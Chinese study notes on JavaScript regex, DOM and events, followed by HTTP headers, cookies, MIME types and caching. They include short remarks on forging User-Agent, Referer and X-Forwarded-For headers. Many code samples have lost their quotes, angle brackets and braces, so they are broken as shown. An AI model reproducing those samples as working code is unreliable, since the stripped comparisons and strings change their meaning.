使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式 正则表达式可用于所有文本搜索和文本替换的操作 /正则表达式主体/修饰符(可选) var patt = /runoob/i /runoob/i 是一个正则表达式。runoob 是一个正则表达式主体 (用于检索)。i 是一个修饰符 (搜索不区分大小写) 字符串的使用 search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。 replace() 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。 RegExp 对象 test()使用 test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true 搜索字符串中的字符 “e”： var patt = /e/;patt.test(The best things in life are free!); 或： /e/.test(The best things in life are free!) exec()使用 exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null var patt1=new RegExp(e);document.write(patt1.exec(The best things in life are free)); 输出为e JavaScript 错误 throw语句创建自定义错误 try 语句测试代码块的错误 catch 语句处理错误 finally 语句 finally 语句不论之前的 try 和 catch 中是否产生异常都会执行该代码块 JavaScript 表单 JavaScript 表单验证 JavaScript 验证输入的数字 JavaScript关键字 this 方法中的 this this 指向调用它所在方法的对象 单独使用 this 单独使用 this，则它指向全局(Global)对象 函数中使用 this 在函数中，函数的所属者默认绑定到 this 上 严格模式下，this 为 undefined，因为严格模式下不允许默认绑定 事件中的 this this 指向了接收事件的 HTML 元素 对象方法中绑定 this 是 person 对象，person 对象是函数的所有者 this.firstName 表示 this (person) 对象的 firstName 属性 显式函数绑定 函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象 let let 声明的变量只在 let 命令所在的代码块 {} 内有效，在 {} 之外不能访问 在相同的作用域或块级作用域中，不能使用 let 关键字来重置 let 关键字声明的变量 const const 用于声明一个或多个常量，声明时必须进行初始化，定义常量的值不能通过再赋值修改，也不能再次声明 const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的 // 创建常量对象const car = type:Fiat, model:500, color:white;// 修改属性:car.color = red;// 添加属性car.owner = Johnson; // 创建常量数组const cars = [Saab, Volvo, BMW];// 修改元素cars[0] = Toyota;// 添加元素cars.push(Audi); void 指定要计算一个表达式但是不返回值 href=#与href=javascript:void(0)的区别 # 包含了一个位置信息，默认的锚是**#top** 也就是网页的上端。而javascript:void(0), 仅仅表示一个死链接。在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id JavaScript JSON JSON 是用于存储和传输数据的格式， 通常用于服务端向网页传递数据 JSON 数组 sites:[ name:Runoob, url:www.runoob.com, name:Google, url:www.google.com, name:Taobao, url:www.taobao.com] JSON 字符串转换为 JavaScript 对象 var text = sites : [ + name:Runoob , url:www.runoob.com , + name:Google , url:www.google.com , + name:Taobao , url:www.taobao.com ]; obj = JSON.parse(text);document.getElementById(demo).innerHTML = obj.sites[1].name + + obj.sites[1].url; 函数 描述 JSON.parse() 用于将一个 JSON 字符串转换为 JavaScript 对象。 JSON.stringify() 用于将 JavaScript 值转换为 JSON 字符串。 !DOCTYPE htmlhtmlbodyfieldset legendBMI计算器/legend label for=meter 身高(m)/label input id=meter required br label for=weight 体重(kg)/label input id=weight required button onclick=myFunction()获取BMI/button p id=bmi/p script function myFunction() var meter,weight,bmii,a; meter=document.getElementById(meter).value; weight=document.getElementById(weight).value; bmii=(weight/(meter*meter)).toFixed(2); if (isNaN(meter)||isNaN(weight)||meter = 0||weight = 0) document.getElementById(bmi).innerHTML = 请正确填写身高和体重！; return; if(bmii18.5)a=体重过低; else if(bmii=24)a=体重过高; else a=正常; document.getElementById(bmi).innerHTML=bmii+a; /script/fieldset/body/html button元素 常用于触发某些操作或事件，如提交表单、执行 JavaScript 函数等。你可以通过 button 元素来创建各种类型的按钮，并且可以为它们添加不同的属性和事件监听器 常用属性 type 属性 button type=button普通按钮/button button type=submit提交按钮/button button type=reset重置按钮/button disabled 属性 禁用按钮，用户无法点击 button disabled禁用按钮/button autofocus 属性 页面加载时，自动聚焦到按钮 button autofocus自动聚焦按钮/button name 属性 为按钮指定名称，通常在表单提交时使用 button name=submitBtn type=submit提交/button value 属性 为按钮指定一个值，通常配合 type=submit 使用，表示提交时传递的参数值 button type=submit value=submitForm提交表单/button 使用 JavaScript 与按钮交互 可以使用 JavaScript 为按钮添加点击事件，执行特定的操作 可以通过 addEventListener() 方法绑定多个事件，支持复杂的事件处理和监听 button onclick=alert(按钮被点击！)点击我/buttonscript // 也可以通过 JavaScript 来绑定事件 const button = document.querySelector(button); button.addEventListener(click, function() alert(按钮被点击！); );/script 动态按钮 按钮可以通过 JavaScript 来动态改变文本、颜色或状态 button id=myButton onclick=changeText()点击我/buttonscript function changeText() const button = document.getElementById(myButton); button.innerHTML = 按钮已被点击; button.style.backgroundColor = red; button.disabled = true; // 禁用按钮 /script onclick与addEventListener() oncllick 一个 HTML 事件属性，用于在用户点击某个元素时触发指定的 JavaScript 函数或代码。这个事件最常见的用法是在按钮、链接或任何可点击的元素上绑定点击事件 基本用法 在 HTML 中使用 onclick button onclick=alert(按钮被点击了！)点击我/button 调用 JavaScript 函数 button onclick=myFunction()点击我/buttonscript function myFunction() alert(按钮被点击了！); /script 通过 JavaScript 动态绑定 onclick 事件 button id=myButton点击我/buttonscript document.getElementById(myButton).onclick = function() alert(按钮被点击了！); ;/script 使用 JavaScript 选择了 ID 为 myButton 的按钮，并为其添加了一个 onclick 事件监听器 通过 onclick 传递事件对象（event） 获取有关事件的更多信息（如点击位置、目标元素等） button onclick=myFunction(event)点击我/buttonscript function myFunction(event) alert(点击位置：X = + event.clientX + , Y = + event.clientY); /script 此例中，event 对象包含了有关点击事件的信息，如鼠标的 clientX 和 clientY 坐标 使用 event.preventDefault()阻止默认行为 阻止点击事件的默认行为（如点击链接时跳转、提交表单等） a href=https://www.example.com onclick=preventDefaultAction(event)点击我/ascript function preventDefaultAction(event) event.preventDefault(); alert(默认行为已被阻止); /script 使用 this 引用当前元素 button onclick=showMessage(this)点击我/buttonscript function showMessage(button) alert(按钮的文本是： + button.innerText); /script 例子中，this 代表按钮本身，button.innerText 获取按钮的文本内容 addEventListener() 是 JavaScript 中用于向元素添加事件监听器的方法。与 onclick 属性相比，addEventListener() 更加灵活和强大，它允许绑定多个事件监听器，并且能够更好地控制事件传播、捕获与冒泡机制 基本语法 element.addEventListener(event, function, useCapture); event：事件类型（如 click、mouseover、keydown 等）。 function：事件触发时执行的回调函数。 useCapture（可选）：一个布尔值，指定事件是应该在捕获阶段触发（true事件从文档的根节点到达目标元素），还是在冒泡阶段触发（false事件从目标元素返回到文档的根节点）。默认值为 false。 基本用法 添加点击事件监听器 button id=myButton点击我/buttonscript const button = document.getElementById(myButton); // 添加点击事件监听器 button.addEventListener(click, function() alert(按钮被点击了！); );/script 传递事件对象 addEventListener() 方法会自动传递一个事件对象给回调函数，可以通过该对象获取更多关于事件的信息 button id=myButton点击我/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function(event) alert(点击位置：X = + event.clientX + , Y = + event.clientY); );/script 使用 this 访问触发事件的元素 在 addEventListener() 中，this 通常指向触发事件的元素。因此，可以使用 this 来访问该元素的属性 button id=myButton点击我/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function() alert(按钮的文本是： + this.innerText); );/script 添加多个事件监听器 addEventListener() 允许你为同一个元素添加多个事件监听器 button id=myButton点击我/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function() alert(第一个事件); ); button.addEventListener(click, function() alert(第二个事件); );/script 例子中，当按钮被点击时，两个警告框会依次弹出 移除事件监听器 用 removeEventListener() 方法来移除已经添加的事件监听器。需要注意的是，removeEventListener() 只能移除通过 addEventListener() 添加的事件监听器，并且需要传递相同的事件类型和回调函数 button id=myButton点击我/buttonscript const button = document.getElementById(myButton); function handleClick() alert(按钮被点击了！); button.addEventListener(click, handleClick); // 移除事件监听器 button.removeEventListener(click, handleClick);/script JavaScript HTML DOM DOM HTML 查找 HTML 元素 通过 id 找到 HTML 元素 p id=intro你好世界!/pp该实例展示了 bgetElementById/b 方法!/pscriptx=document.getElementById(intro);document.write(p文本来自 id 为 intro 段落: + x.innerHTML + /p);/script 通过标签名找到 HTML 元素 查找 id=“main” 的元素，然后查找 id=“main” 元素中的所有 p 元素 p你好世界!/pdiv id=mainp DOM 是非常有用的。/pp该实例展示了 bgetElementsByTagName/b 方法/p/divscriptvar x=document.getElementById(main);var y=x.getElementsByTagName(p);document.write(id=main元素中的第一个段落为： + y[0].innerHTML);/script 通过类名找到 HTML 元素 p class=intro你好世界!/pp该实例展示了 bgetElementsByClassName/b 方法!/pscriptx=document.getElementsByClassName(intro);document.write(p文本来自 class 为 intro 段落: + x[0].innerHTML + /p);/script 改变HTML 改变 HTML 输出流 在 JavaScript 中，document.write() 可用于直接向 HTML 输出流写内容 [!CAUTION] 绝对不要在文档(DOM)加载完成之后使用 document.write()。这会覆盖该文档 改变 HTML 内容 修改 HTML 内容的最简单的方法是使用 innerHTML 属性 document.getElementById(id).innerHTML=新的 HTML 改变 HTML 属性 document.getElementById(id).attribute=新属性值 DOM CSS 改变 HTML 样式 document.getElementById(id).style.property=新样式 使用事件 HTML DOM 允许我们通过触发事件来执行代码 比如事件：元素被点击。页面加载完成。输入框被修改。 下例改变字体颜色 h1 id=id1我的标题 1/h1button type=button onclick=document.getElementById(id1).style.color=red点我!/button 下例使元素显示或消失 p id=p1这是一个文本。/pinput type=button value=隐藏文本 onclick=document.getElementById(p1).style.visibility=hidden /input type=button value=显示文本 onclick=document.getElementById(p1).style.visibility=visible / DOM 事件 对事件做出反应 用户点击某个元素时执行代码 h1 onclick=this.innerHTML=Ooops!点击文本!/h1 h1 onclick=changetext(this)点击文本!/h1scriptfunction changetext(id) id.innerHTML=Ooops!;/script HTML事件属性 如需向 HTML 元素分配 事件，可以使用事件属性 如向 button 元素分配 onclick 事件： p点击按钮执行 emdisplayDate()/em 函数./pbutton onclick=displayDate()点这里/buttonscriptfunction displayDate() document.getElementById(demo).innerHTML=Date();/scriptp id=demo/p 使用HTML DOM 来分配事件 如向 button 元素分配 onclick 事件： p点击按钮执行 emdisplayDate()/em 函数./pbutton id=myBtn点这里/buttonscriptdocument.getElementById(myBtn).onclick=function()displayDate();function displayDate() document.getElementById(demo).innerHTML=Date();/scriptp id=demo/p 上例中，名为 displayDate 的函数被分配给 id=“myBtn” 的 HTML 元素。 按钮点击时Javascript函数将会被执行 onload和onunload事件 onload 和 onunload 事件会在用户进入或离开页面时被触发 [!NOTE] onload 事件可用于检测访问者的浏览器类型和浏览器版本，并基于这些信息来加载网页的正确版本。 onload 和 onunload 事件可用于处理 cookie body onload=checkCookies()scriptfunction checkCookies() if (navigator.cookieEnabled==true) alert(Cookies 可用) else alert(Cookies 不可用) /scriptp弹窗-提示浏览器 cookie 是否可用。/p /body onchange事件 onchange 事件常结合对输入字段的验证来使用 scriptfunction myFunction() var x=document.getElementById(fname); x.value=x.value.toUpperCase();/script输入你的名字: input type=text id=fname onchange=myFunction()p当你离开输入框后，函数将被触发，将小写字母转为大写字母。/p onmouseover 和 onmouseout 事件 onmouseover 和 onmouseout 事件可用于在用户的鼠标移至 HTML 元素上方或移出元素时触发函数 div onmouseover=mOver(this) onmouseout=mOut(this)Mouse Over Me/divscriptfunction mOver(obj) obj.innerHTML=Thank Youfunction mOut(obj) obj.innerHTML=Mouse Over Me/script onmousedown、onmouseup 以及 onclick 事件 onmousedown, onmouseup 以及 onclick 构成了鼠标点击事件的所有部分。首先当点击鼠标按钮时，会触发 onmousedown 事件，当释放鼠标按钮时，会触发 onmouseup 事件，最后，当完成鼠标点击时，会触发 onclick 事件 DOM EventListener addEventListener() 方法 p该实例使用 addEventListener() 方法在按钮中添加点击事件。 /pbutton id=myBtn点我/buttonp id=demo/pscriptdocument.getElementById(myBtn).addEventListener(click, displayDate);function displayDate() document.getElementById(demo).innerHTML = Date();/script 语法 element.addEventListener(event, function, useCapture); 第一个参数是事件的类型 (如 “click” 或 “mousedown”). 第二个参数是事件触发后调用的函数。 第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。 向原元素添加事件句柄 如当用户点击元素时弹出 “Hello World!” ： p该实例使用 addEventListener() 方法在按钮中添加点击事件。 /pbutton id=myBtn点我/buttonscriptdocument.getElementById(myBtn).addEventListener(click, function() alert(Hello World!););/script 向同一个元素中添加多个事件句柄 addEventListener() 方法允许向同一个元素添加多个事件，且不会覆盖已存在的事件： p该实例使用 addEventListener() 方法向同个按钮中添加两个点击事件。/pbutton id=myBtn点我/buttonscriptvar x = document.getElementById(myBtn);x.addEventListener(click, myFunction);x.addEventListener(click, someOtherFunction);function myFunction() alert (Hello World!)function someOtherFunction() alert (函数已执行!)/script 你可以向同个元素添加不同类型的事件： p实例使用 addEventListener() 方法在同一个按钮中添加多个事件。/pbutton id=myBtn点我/buttonp id=demo/pscriptvar x = document.getElementById(myBtn);x.addEventListener(mouseover, myFunction);x.addEventListener(click, mySecondFunction);x.addEventListener(mouseout, myThirdFunction);function myFunction() document.getElementById(demo).innerHTML += Moused over!brfunction mySecondFunction() document.getElementById(demo).innerHTML += Clicked!brfunction myThirdFunction() document.getElementById(demo).innerHTML += Moused out!br/script 向 Window 对象添加事件句柄 当用户重置窗口大小时添加事件监听： window.addEventListener(resize, function() document.getElementById(demo).innerHTML = sometext;); 事件冒泡或事件捕获 事件传递有两种方式：冒泡与捕获 事件传递定义了元素事件触发的顺序 将 p 元素插入到 div 元素中，用户点击 p 元素： 在 冒泡 中，内部元素的事件会先被触发，然后再触发外部元素，即： p 元素的点击事件先触发，然后会触发 div 元素的点击事件。 在 捕获 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即： div 元素的点击事件先触发 ，然后再触发 p 元素的点击事件。 addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型： addEventListener(event, function, useCapture); 默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递 p实例演示了在添加不同事件监听时，冒泡与捕获的不同。/pdiv id=myDiv p id=myP点击段落，我是冒泡。/p/divbrdiv id=myDiv2 p id=myP2点击段落，我是捕获。 /p/divscript!--冒泡--document.getElementById(myP).addEventListener(click, function() alert(你点击了 P 元素!);, false);document.getElementById(myDiv).addEventListener(click, function() alert( 你点击了 DIV 元素 !);, false);!--捕获--document.getElementById(myP2).addEventListener(click, function() alert(你点击了 P2 元素!);, true);document.getElementById(myDiv2).addEventListener(click, function() alert(你点击了 DIV2 元素 !);, true);/script removeEventListener() 方法 removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄: HTML DOM 事件对象参考手册 DOM 元素 创建新的 HTML 元素 (节点) 要创建新的 HTML 元素 (节点)需要先创建一个元素，然后在已存在的元素中添加它 appendChild() 是 JavaScript 中用于将一个节点（元素或文本节点）追加到指定父节点的最后一个子节点位置的方法 div id=div1 !-- 这是父元素 -- p id=p1这是一个段落。/p p id=p2这是另外一个段落。/p/divscript // 1. 找到父元素 div1 var parentElement = document.getElementById(div1); // 2. 创建一个新的子元素 p var childElement = document.createElement(p); // 3. 创建子元素中的文本内容 var childText = document.createTextNode(这是一个新的段落。); // 4. 将文本内容放入子元素中 childElement.appendChild(childText); // 5. 将子元素添加到父元素中 parentElement.appendChild(childElement);/script insertBefore() 用于在指定的父元素中，将一个新节点插入到某个已存在的子节点之前 div id=div1 p id=p1这是第一个段落。/p p id=p2这是第二个段落。/p/divscript // 获取父元素 div1 var parentElement = document.getElementById(div1); // 创建一个新的段落节点 var newParagraph = document.createElement(p); newParagraph.innerText = 这是一个新插入的段落。; // 找到参考节点（p1） var referenceNode = document.getElementById(p1); // 将新段落插入到 p1 之前 parentElement.insertBefore(newParagraph, referenceNode);/script 移除已存在的元素 HTML 文档中 div 元素包含两个子节点 (两个 p 元素): div id=div1p id=p1这是一个段落。/pp id=p2这是另外一个段落。/p/div 查找 id=“div1” 的元素: var parent = document.getElementById(div1); 查找 id=“p1” 的 p 元素: var child = document.getElementById(p1); 从父元素中移除子节点： parent.removeChild(child); [!CAUTION] 删除节点必须知道父节点 替换 HTML 元素 - replaceChild() div id=div1p id=p1这是一个段落。/pp id=p2这是另外一个段落。/p/div scriptvar para = document.createElement(p);var node = document.createTextNode(这是一个新的段落。);para.appendChild(node); var parent = document.getElementById(div1);var child = document.getElementById(p1);parent.replaceChild(para, child);/script HTML DOM 集合 HTML Collection 对象 getElementsByTagName() 方法返回 HTMLCollection对象。 HTMLCollection 对象类似包含 HTML 元素的一个数组。 var x = document.getElementsByTagName(p); 集合中的元素可以通过索引(以 0 为起始位置)来访问。访问第二个 p 元素可以是以下代码:y = x[1]; [!NOTE] HTMLCollection 不是一个数组！ 但可以像数组一样，使用索引来获取元素 HTML Collection 对象 .length 属性 length 属性定义了集合中元素的数量 获取 p 元素的集合： var myCollection = document.getElementsByTagName(p); 显示集合元素个数： document.getElementById(demo).innerHTML = myCollection.length; 集合 length 属性常用于遍历集合中的元素。 NodeList 对象 NodeList 对象是一个从文档中获取的节点列表 (集合) [!CAUTION] HTML Collection是 HTML 元素的集合。 NodeList 是一个文档节点的集合。 NodeList 与 HTMLCollection 都与数组对象有点类似，可以使用索引 (0, 1, 2, 3, 4, …) 来获取元素。 NodeList 与 HTMLCollection 都有 length 属性。 HTMLCollection 元素可以通过 name，id 或索引来获取。 NodeList 只能通过索引来获取。 只有 NodeList 对象有包含属性节点和文本节点。","tags":["前端","JavaScript","DOM"],"categories":["前端"]},{"title":"HTTP","path":"/2025/07/09/HTTP/","content":"HTTP HTTP概述 HTTP 是一种用作获取诸如 HTML 文档这类资源的协议（TTP 是一种应用层的协议，通过 TCP 或 TLS（一种加密过的 TCP 连接）来发送）。它是 Web 上进行任何数据交换的基础，也是一种客户端—服务器（client-server）协议 HTTP请求包的结构 请求行 URL （统一资源定位符）是因特网中的唯一资源的地址。它是浏览器用于检索已发布资源（例如 HTML 页面、CSS 文档、图像等）的关键机制之一 URL基本内容 协议（scheme） HTTPS 、 HTTP、FTP 权威（authority） 权威包括域名（例如 www.example.com）和端口（80），由冒号分隔 注：邮件客户端（mailto:foobar）不使用权威（其包含方案） 路径（Path） /path/to/myfile.html 、/index.html是 Web 服务器上资源的路径 参数（Parameters） ?key1=value1key2=value2 是提供给 Web 服务器的额外参数(参数是用 符号分隔的键/值对列表) 锚点（Anchor） #SomewhereInTheDocument 是资源本身的另一部分的锚点 锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向 # 后面的部分（也称为片段标识符）不会随请求被发送到服务器 一些URL 数据URL：以 data: 方案为前缀的 URL，允许内容创建者在文档中嵌入小文件 注：URL 编码使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。 URL 不能包含空格。URL 编码通常使用 + 来替换空格。 请求方式 请求方式： GET和POST get 请求 GET 请求主要用于从服务器获取数据，常用于获取静态资源（网页、图片、文件等） get请求的参数传递方式 在 HTTP 请求中，GET 请求可以通过 URL 参数或者请求体的方式传递参数。 URL 参数：GET 请求可以通过 URL 中指定的 key-value 形式传递参数。 http://example.com/search?q=testpage=2 ？后 key= value post请求 POST 请求主要用于向服务器提交数据，通常用于创建、更新或删除资源、上传文件、发送 JSON 数据 post请求的参数传递方式：URL 参数和请求体。 1.URL 参数：POST 请求可以通过 URL 中指定的 key-value 形式传递参数。例如，在访问如下 URL 时： http://example.com/search?q=testpage=2 2.请求体（仅适用于 POST、PUT、PATCH 请求）：当 POST、PUT 或 PATCH 请求的 URL 中没有指定参数时，参数会被放置在请求体中。请求体中的数据可以是表单数据、JSON 数据等。例如，使用 POST 请求将 JSON 数据发送到如下 URL 时： http://example.com/users 请求体中的 JSON 数据如下： name: John Doe, email: john.doe@example.com get和post区别 get 和 post 请求的使用场景 get 获取数据：GET 请求适合用于从服务器获取数据，例如获取网页内容、查询数据库、获取资源文件等。由于 GET 请求的参数会显示在 URL 中，因此它适用于不需要保密的参数传递。 缓存友好：GET 请求的响应可以被缓存，这对于一些静态资源的获取非常有益，可以提高性能和减少服务器负载。 链接导航：GET 请求可以用于在浏览器中进行链接导航，通过在 URL 中传递参数来指定要导航到的页面或资源。 post 提交数据：POST 请求适合用于向服务器提交数据，例如提交表单、上传文件等。由于 POST 请求的参数不会显示在 URL 中，因此它适用于传递敏感数据或大量参数。 创建资源：POST 请求可以用于在服务器上创建新的资源，例如创建新的用户、发布新的文章等。 执行非幂等操作：POST 请求是非幂等的，意味着多次发送相同的 POST 请求可能会产生不同的结果。这适用于一些需要执行不可重复操作的场景，例如订单支付、密码修改等。 加键值对时get在url中？a=1 post在请求体中a=11 请求头及其内容 常见的请求头及作用 Host，Referer，User-Agent，Cookie，Content-Type，X-Forwarded-For 注：POST 请求（包含 HTML 表单数据）需要主体 主体大致可分为两类： *单一资源（Single-resource）主体，由一个单文件组成。该类型的主体由两个标头定义：Content-Type和Content-Length 多资源（Multiple-resource）主体，由多部分主体组成，每一部分包含不同的信息位。通常是和 HTML 表单连系在一起。 Host：指定请求的服务器的域名和端口号。 User-Agent：包含发出请求的用户代理（浏览器）的信息，可用来浏览器伪造。 一个典型的 User-Agent 字符串可能看起来像这样： User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 这个字符串包含了以下信息： 浏览器：Mozilla/5.0 操作系统：Windows NT 10.0 平台：Win64; x64 浏览器核心：AppleWebKit/537.36 浏览器名称：Chrome 浏览器版本：58.0.3029.110 渲染引擎：Safari/537.36 Accept：指定客户端能够处理的媒体类型。 Accept-Language：指定客户端偏好的语言。 Accept-Encoding：指定客户端能够处理的压缩算法。 Authorization：用于身份验证的凭证。 [!IMPORTANT] HTTP 基本认证 通过在请求头 (Authorization 头) 中发送用户名和密码来进行身份验证。用户名和密码（用户名：密码）会经过 Base64 编码，但 不会加密 客户端提供用户名和密码，并在 Authorization 头中发送： Authorization: Basic Base64编码的用户名:密码 Cookie：Cookie 是一种服务器发送到用户浏览器并保存在本地的数据。它用于跟踪和识别用户会话，存储用户的偏好设置。 基本概念 会话Cookie：只在浏览器会话期间有效，当用户关闭浏览器时，这些Cookie就会被删除。浏览器定义了“当前会话”结束的时间，一些浏览器重启时会使用会话恢复。这可能导致会话 cookie 无限延长。 持久Cookie：在过期时间（Expires）指定的日期或有效期（Max-Age）指定的一段时间后被删除。 示例 假设服务器想要设置一个Cookie，其内容如下： Set-Cookie: sessionId=abc123; Expires=Wed, 09 Jun 2024 10:18:14 GMT; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax 在这个例子中： sessionId=abc123 是Cookie的名称-值对（存储在Cookie中的数据） Expires=Wed, 09 Jun 2024 10:18:14 GMT 定义了Cookie的过期时间。ax-Age属性指定一个相对于创建时的时间长度（以秒为单位） Domain=example.com 指定了Cookie的有效域名（哪些域名下的页面请求可以包含这个Cookie）如果未指定，默认为创建Cookie的服务器的域名 Path=/ 指定了Cookie的有效路径。 Secure 属性表示Cookie仅通过HTTPS发送。 HttpOnly 属性表示Cookie不能被客户端脚本（如JavaScript）访问。 [!CAUTION] XSS 攻击是一种常见的攻击方式，攻击者通过向 Web 页面注入恶意的 JavaScript 代码来窃取用户数据。使用 HttpOnly 标记的 Cookie 可以防止恶意 JavaScript 代码通过 document.cookie 或其他方式获取敏感数据（如会话 Cookie） 但它并不能防止 Cookie 被服务器端访问，攻击者如果能够获得服务器端的访问权限（如 SQL 注入、服务器配置错误等）或进行CSRF（跨站请求伪造）攻击，仍然有可能窃取 Cookie 因此，它需要与其他安全措施（如 Secure、SameSite）结合使用，以提供全面的安全防护 SameSite=Lax 属性表示在跨站请求时，Cookie不会随请求发送，除非请求是同站的。 Content-Length：请求体的长度。 Content-Type：指定资源的媒体类型（ MIME 类型）（媒体类型（也通常称为多用途互联网邮件扩展或 MIME 类型）是一种标准，用来表示文档、文件或一组数据的性质和格式），告诉接收方如何处理传输的数据 [!WARNING] 浏览器通常使用 MIME 类型而不是文件扩展名来决定如何处理 URL，因此 Web 服务器在 Content-Type 响应标头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也可能被错误处理 以下是一些常见的 Content-Type 值及其对应的数据格式： 文本类型 text/html：HTML 文档。 [!CAUTION] 如果需要 XML 的严格解析规则、![CDATA[...]](在 XML 中，所有的字符数据默认都会被解析，并且需要处理特殊字符（比如 会变成 ， 会变成 ）。但是，如果你使用 CDATA，则该部分中的所有内容都会被当作普通文本处理，直到遇到 ]]，这时 CDATA 部分结束)或 HTML/SVG/MathML 命名空间以外的元素，请使用 application/xml 或 application/xhtml+xml text/plain：纯文本，文本文件的默认值。即使它其实意味着未知的文本文件，但浏览器认为是可以直接展示的。 [!CAUTION] text/plain 并不意味“任何种类的文本数据”。如果浏览器期待的是某种特定的文本数据，很可能不会将其视为匹配。具体来说，如果从声明 CSS 文件的 link 元素中下载了一个 text/plain 文件，那么如果提供的是 text/plain类型，就不会将其识别为有效的 CSS 文件。CSS MIME 类型需要使用 text/css text/css：层叠样式表（CSS），在网页中要被解析为 CSS 的任何 CSS 文件必须指定 MIME 为 text/css text/javascript：JavaScript 代码（已废弃，应使用 application/javascript）。 图像类型 image/gif：图形交换格式（GIF） image/jpeg：联合图像专家小组图片（JPEG） image/png：便携式网络图形（PNG） image/svg+xml：可缩放矢量图形（SVG） image/webp：Web 图像格式（WEBP） image/apng：动画便携式网络图形（APNG） image/avif：AV1 图像文件格式（AVIF） 音频和视频类型 audio/mpeg：MPEG 音频。 video/mp4：MP4 视频。 audio/ogg：Ogg 音频。 video/ogg：Ogg 视频。 video/webm: WebM格式的视频。 应用程序类型 application/json：JSON 数据。 application/xml：XML 数据。 application/pdf：PDF 文档。 application/zip：ZIP 压缩文件。 application/javascript：JavaScript 代码（现代浏览器推荐使用）。 多部分类型 multipart/form-data：用于表单数据的传输，允许在单个请求中发送多个文件和字段。这通常用于文件上传和多值数据传输，可用于HTML表单从浏览器发送信息给服务器 multipart/byteranges：用于定义多个字节范围，通常用于视频流或大文件下载 其他类型 application/octet-stream：这是二进制文件的默认值。由于这意味着未知的二进制文件，浏览器一般不会自动执行或询问执行。浏览器将这些文件视为 Content-Disposition 标头被设置为 attachment 一样，并弹出“另存为”对话框 application/x-www-form-urlencoded：用于表单数据的传输，通常用于 GET 和 POST 请求。 字符编码 许多 Content-Type 值可以包含字符编码信息，如 text/html; charset=utf-8，这指定了使用 UTF-8 编码的 HTML 文档。 [!IMPORTANT] 在 HTML 表单中，enctype 是一个属性，用于指定在提交表单时数据的编码类型。它决定了表单数据在发送到服务器时的格式在 HTML 表单中，enctype 是一个属性，用于指定在提交表单时数据的编码类型。它决定了表单数据在发送到服务器时的格式 application/x-www-form-urlencoded（默认）：适用于提交常规文本数据，简单的表单提交。 multipart/form-data：适用于上传文件时的表单提交，当表单包含文件上传时，一定要使用 multipart/form-data，否则文件将无法正确上传 text/plain：以纯文本形式提交数据，每对 name=value 由换行符分隔。 Referer：指示请求来源的页面URL（用户是从哪个页面点击链接到达当前请求的页面的），可用来服务器伪造 https://www.xxxx.com，这个头部字段通常用于分析流量来源、防止CSRF（跨站请求伪造）攻击以及跟踪用户行为 示例 假设你访问了一个网站 http://example.com/page1，然后从该页面点击链接跳转到 http://example.com/page2，浏览器在请求 page2 时，通常会将以下头部添加到请求中： Referer: http://example.com/page1 假设用户从页面 https://www.example.com/page1.html 点击一个链接，跳转到 https://www.example.com/page2.html，那么在请求 page2.html 时，HTTP请求的 Referer 头部可能如下： GET /page2.html HTTP/1.1Host: www.example.comReferer: https://www.example.com/page1.html 11.X-Forwarded-For:用于在HTTP请求经过代理服务器或负载均衡器时保留原始客户端的IP地址信息，可用于修改ip 如127.0.0.1 X-Forwarded-For头部字段的格式如下： X-Forwarded-For: client-IP, proxy1-IP, proxy2-IP, ... 其中，列表中的第一个IP地址（client-IP）是客户端的真实IP地址，随后的IP地址表示请求依次经过的代理服务器的IP地址。 HTTP响应包的结构 响应行 HTTP/1.1 404 Not Found 协议版本，通常为 HTTP/1.1。 状态码（status code），表明请求是成功或失败。常见的状态码是 200（OK。请求成功）、404 （Not Found。服务器无法找到请求的资源）或301（Moved Permanently。请求资源的 URI 已被改变） 状态文本（status text）。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息 响应头 通用标头（General header），例如 Via，适用于整个消息。 响应标头（Response header），例如 Vary 和 Accept-Ranges，提供有关服务器的其他信息，这些信息不适合状态行。 表示标头（Representation header），例如 Content-Type 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在） Content-Type：响应体的媒体类型。 Content-Length：响应体的长度。 Cache-Control：控制响应的缓存行为。 Expires：指定资源到期的时间。 Set-Cookie：设置客户端的Cookie。 Location：用于重定向的URL。 Server：包含服务器软件的信息。 WWW-Authenticate：用于HTTP认证的挑战。 Last-Modified：资源最后修改的时间。 ETag：资源的特定版本的标识符。 HTTP缓存 HTTP 缓存会存储与请求关联的响应，并将存储的响应复用于后续请求 私有缓存 绑定到特定客户端的缓存——通常是浏览器缓存 如果响应包含个性化内容并且你只想将响应存储在私有缓存中，则必须指定 private 指令 Cache-Control: private [!CAUTION] 如果响应具有 Authorization 标头，则不能将其存储在私有缓存（或共享缓存，除非 Cache-Control 指定的是 public）中 [!NOTE] public 值具有使响应可存储的效果，只有在设置了 Authorization 标头时需要存储响应时才应使用 public 指令。否则不需要，因为只要给出了 max-age，响应就会存储在共享缓存中。 共享缓存 位于客户端和服务器之间，可以存储能在用户之间共享的响应 代理缓存 除了访问控制的功能外，一些代理还实现了缓存以减少网络流量 托管缓存 